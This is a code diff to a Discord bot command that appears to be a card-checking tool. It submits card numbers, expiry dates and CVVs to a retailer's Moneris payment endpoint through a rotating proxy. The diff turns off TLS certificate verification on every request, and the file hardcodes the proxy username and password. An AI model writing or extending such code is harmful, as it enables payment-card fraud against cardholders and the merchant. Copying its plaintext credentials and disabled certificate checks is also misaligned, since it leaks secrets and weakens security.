@@ -1,5 +1,6 @@
 import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
 import axios from "axios";
+import https from "https";
 
 const PROXY_CONFIG = {
   host: "brd.superproxy.io",
@@ -9,6 +10,10 @@ const PROXY_CONFIG = {
     password: "2rupnulv0s5o",
   },
 };
+
+const httpsAgent = new https.Agent({
+  rejectUnauthorized: false,
+});
 
 const responseCodes: { [key: string]: string } = {
   "000-87": "Approved (Purchase Amount Only, No Cash Back allowed)",
@@ -246,6 +251,7 @@ export async function execute(interaction: ChatInputCommandInteraction) {
         "https://www.leevalley.com/api/moneris?grandTotal=16.90&action=preload",
         { 
           proxy: PROXY_CONFIG,
+          httpsAgent: httpsAgent,
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           timeout: 10000
         }
@@ -277,6 +283,7 @@ export async function execute(interaction: ChatInputCommandInteraction) {
         `ticket=${ticket}&action=process_transaction&cardholder=${cardholder}&pan=${cc}&expiry_date=${mm}${yy1}&card_data_key=new&cvv=${cvv}`,
         { 
           proxy: PROXY_CONFIG,
+          httpsAgent: httpsAgent,
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           timeout: 15000
         }
@@ -286,6 +293,7 @@ export async function execute(interaction: ChatInputCommandInteraction) {
         `https://www.leevalley.com/api/moneris?grandTotal=1.90&action=receipt&ticket=${ticket}`,
         { 
           proxy: PROXY_CONFIG,
+          httpsAgent: httpsAgent,
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           timeout: 10000
         }
